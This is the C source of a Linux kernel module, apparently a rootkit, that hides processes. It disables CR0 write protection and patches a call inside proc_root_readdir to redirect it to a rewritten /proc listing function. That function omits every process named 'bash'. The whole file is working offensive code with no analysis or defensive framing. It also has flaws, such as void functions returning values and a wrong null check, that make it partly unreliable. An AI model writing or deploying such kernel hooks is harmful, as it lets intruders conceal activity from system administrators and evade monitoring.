#include "/usr/src/linux-4.15/include/linux/kernel.h"
#include "/usr/src/linux-4.15/include/linux/module.h"
#include "/usr/src/linux-4.15/include/linux/sched.h"
#include "/usr/src/linux-4.15/include/linux/fs.h"
#include "/usr/src/linux-4.15/include/linux/file.h"
#include "/usr/src/linux-4.15/include/linux/proc_fs.h"
#include "/usr/src/linux-4.15/include/linux/init.h"
#include "/usr/src/linux-4.15/include/linux/types.h"
#include "/usr/src/linux-4.15/include/linux/init_task.h"
#include "/usr/src/linux-4.15/include/linux/pid_namespace.h"
#include "/usr/src/linux-4.15/include/linux/idr.h"
#include "/usr/src/linux-4.15/include/linux/cred.h"
#include "/usr/src/linux-4.15/include/linux/pid.h"
#include "/usr/src/linux-4.15/include/linux/dcache.h"
#include "/usr/src/linux-4.15/include/linux/kallsyms.h"
#include "/usr/src/linux-4.15/include/linux/string.h"
#define FIRST_PROCESS_ENTRY 256
#define PROC_NUMBUF 13
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");

typedef int instantiate_t(struct inode *, struct dentry *,
				     struct task_struct *, const void *);

typedef struct tgid_iter (*hack_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter);
hack_next_tgid new_next_tgid;

typedef bool (*hack_proc_fill_cache)(struct file *file, struct dir_context *ctx,
	const char *name, int len,
	instantiate_t instantiate, struct task_struct *task, const void *ptr);
hack_proc_fill_cache new_proc_fill_cache;

typedef int (*hack_proc_pid_instantiate)(struct inode *dir,
				   struct dentry * dentry,
				   struct task_struct *task, const void *ptr);
hack_proc_pid_instantiate new_proc_pid_instantiate;

typedef bool (*hack_ptrace_may_access)(struct task_struct *task, unsigned int mode);
hack_ptrace_may_access new_ptrace_may_access;

typedef int (*origin_proc_pid_readdir_point)(struct file *file,struct dir_context *ctx);
origin_proc_pid_readdir_point origin_proc_pid_readdir;


void
set_addr_rw(void)
{ 
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
}


void
set_addr_ro(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}

struct tgid_iter {
	unsigned int tgid;
	struct task_struct *task;
};

static bool new_has_pid_permissions(struct pid_namespace *pid,
				 struct task_struct *task,
				 int hide_pid_min)
{
	new_ptrace_may_access = (hack_ptrace_may_access)kallsyms_lookup_name("ptrace_may_access");
	if(!new_proc_fill_cache){
		printk("ptrace_may_access err;");
		return false;		
	}
	if (pid->hide_pid < hide_pid_min)
		return true;
	if (in_group_p(pid->pid_gid))
		return true;

	return new_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
}

int new_proc_pid_readdir(struct file *file,struct dir_context *ctx){
	new_next_tgid = (hack_next_tgid)kallsyms_lookup_name("next_tgid");
	if(!new_next_tgid){
		printk("next_tgid err;");
		return -1;		
	}

	new_proc_fill_cache = (hack_proc_fill_cache)kallsyms_lookup_name("proc_fill_cache");
	if(!new_proc_fill_cache){
		printk("proc_fill_cache err;");
		return -1;		
	}
	new_proc_pid_instantiate = (hack_proc_pid_instantiate)kallsyms_lookup_name("proc_pid_instantiate");
	if(!new_proc_pid_instantiate){
		printk("proc_pid_instantiate err;");
		return -1;		
	}
	struct tgid_iter iter;
	struct pid_namespace *ns = file_inode(file)->i_sb->s_fs_info;
	loff_t pos = ctx->pos;

	if (pos >= PID_MAX_LIMIT + TGID_OFFSET)
		return 0;

	if (pos == TGID_OFFSET - 2) {
		struct inode *inode = d_inode(ns->proc_self);
		if (!dir_emit(ctx, "self", 4, inode->i_ino, DT_LNK))
			return 0;
		ctx->pos = pos = pos + 1;
	}
	if (pos == TGID_OFFSET - 1) {
		struct inode *inode = d_inode(ns->proc_thread_self);
		if (!dir_emit(ctx, "thread-self", 11, inode->i_ino, DT_LNK))
			return 0;
		ctx->pos = pos = pos + 1;
	}
	iter.tgid = pos - TGID_OFFSET;
	iter.task = NULL;
	for (iter = new_next_tgid(ns, iter);
	     iter.task;
	     iter.tgid += 1, iter = new_next_tgid(ns, iter)) {
		char name[PROC_NUMBUF];
		int len;

		cond_resched();
		if (!new_has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
			continue;

		len = snprintf(name, sizeof(name), "%d", iter.tgid);
		ctx->pos = iter.tgid + TGID_OFFSET;
		if(strcmp("bash",iter.task->comm)==0){
			printk("Hidden process is [tgid:%d][pid:%d]:%s\n",ctx->pos,iter.task->pid,iter.task->comm);
			continue;				
		}
		
		if (!new_proc_fill_cache(file, ctx, name, len,
				     new_proc_pid_instantiate, iter.task, NULL)) {
			put_task_struct(iter.task);
			return 0;
		}
	}
	ctx->pos = PID_MAX_LIMIT + TGID_OFFSET;
	return 0;
}



void offset_patch(char *fun,int origin,int new){
	unsigned int i=0;
	unsigned char buf[4]={0};
	unsigned int origin_offset=0;
	unsigned int hook_offset=0;
	unsigned int call_func_addr = 0;
	
	while(1){
		if(i>512){return 0;}
	
		if((fun[0]&0x000000ff)==0xe8){

			buf[0] = fun[1];
			buf[1] = fun[2];
			buf[2] = fun[3];
			buf[3] = fun[4];
			printk("%lx\n",fun[1]);
			printk("%lx\n",buf[0]);
			origin_offset = *(int *)buf;
			call_func_addr = (int)fun+origin_offset+5;
			if(call_func_addr == origin){printk("[addr]origin=%lx\n",call_func_addr);break;}				
		}
		fun++;
		i++;
	}
	hook_offset = (unsigned long)new - (unsigned long)fun-5;
	fun[1]=(hook_offset&0x000000ff);
	fun[2]=(hook_offset&0x0000ff00) >> 8;
	fun[3]=(hook_offset&0x00ff0000) >> 16;
	fun[4]=(hook_offset&0xff000000) >> 24;
	return 1;
}

int __init hack_kernel(void){

	unsigned char *fun = (char *)kallsyms_lookup_name("proc_root_readdir");
	//printk("[address]proc_root_readdir=%lx\n",fun);
	origin_proc_pid_readdir = kallsyms_lookup_name("proc_pid_readdir");
	//printk("[address]proc_pid_readdir=%lx\n",origin_proc_pid_readdir);
	if(!origin_proc_pid_readdir){
		printk("error origin_proc_pid_readdir");
		return -1;
	}

	set_addr_rw();
	
	offset_patch(fun,origin_proc_pid_readdir,new_proc_pid_readdir);
	
	set_addr_ro();

	return 0;
}

void __exit hack_kernel_exit(void){
	printk("hack kernel goodbye!!\n");
	unsigned char *fun = (char *)kallsyms_lookup_name("proc_root_readdir");
	origin_proc_pid_readdir = kallsyms_lookup_name("proc_pid_readdir");
	
	if(!origin_proc_pid_readdir){
		printk("error origin_proc_pid_readdir");
		return -1;
	}

	set_addr_rw();
	offset_patch(fun,new_proc_pid_readdir,origin_proc_pid_readdir);
	set_addr_ro();
	return 0;
}
module_init(hack_kernel);
module_exit(hack_kernel_exit)
